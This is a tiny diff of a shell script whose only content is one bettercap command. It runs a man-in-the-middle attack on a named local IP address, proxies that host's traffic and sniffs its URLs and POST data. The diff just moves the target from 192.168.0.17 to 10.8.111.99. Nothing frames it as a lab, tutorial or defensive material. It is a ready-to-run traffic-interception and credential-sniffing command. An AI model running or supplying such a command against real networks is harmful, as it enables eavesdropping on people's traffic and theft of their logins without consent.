@@ -1,3 +1,3 @@
 #!/bin/sh
 
-sudo bettercap -X -T 192.168.0.17 --proxy -P URL,POST
+sudo bettercap -X -T 10.8.111.99 --proxy -P URL,POST
